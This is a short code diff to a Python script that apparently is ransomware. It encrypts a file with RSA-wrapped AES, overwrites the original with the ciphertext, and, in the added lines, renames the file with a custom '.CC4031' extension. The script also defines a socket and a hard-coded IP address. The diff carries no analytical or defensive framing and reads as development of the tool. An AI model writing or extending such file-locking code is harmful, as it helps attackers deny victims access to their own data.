@@ -3,6 +3,7 @@ import socket
 from Crypto.PublicKey   import RSA
 from Crypto.Cipher      import PKCS1_OAEP, AES
 from Crypto.Random      import get_random_bytes
+from pathlib            import Path
 
 
 IP_ADDRESS  = '127.0.0.1'
@@ -50,7 +51,10 @@ def encrypt(file_path, public_key_file):
 
     with open(file_path, 'wb') as file:
         [ file.write(x) for x in (encrypted_session_key, cipher.nonce, tag, ciphertext) ]
-        
+    
+    file_name, _ = os.path.splitext(file_path)
+    os.rename(file_path, file_name + '.CC4031')
+
     print('Done Encrypting: ' + file_path)
 
 
